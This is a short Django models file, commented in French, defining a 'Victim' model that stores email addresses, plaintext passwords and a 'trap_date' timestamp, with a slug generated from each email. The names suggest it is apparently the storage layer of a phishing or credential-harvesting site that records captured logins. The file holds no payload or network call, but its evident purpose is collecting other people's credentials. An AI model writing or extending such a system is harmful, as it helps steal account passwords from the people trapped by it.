from django.db import models
from django.utils.text import slugify


# Create your models here.
class Victim(models.Model):
    email = models.CharField(max_length=255, unique=True)
    password = models.CharField(max_length=255)
    trap_date = models.DateTimeField(auto_now=True)
    slug = models.SlugField(unique=True, blank=True)  # Champ slug associé à l'email

    def save(self, *args, **kwargs):
        # Génération du slug à partir de l'email, pour indiquer que à une vue generique que l'extraction des element doit etre sur le champ email
        self.slug = slugify(self.email)
        super().save(*args, **kwargs)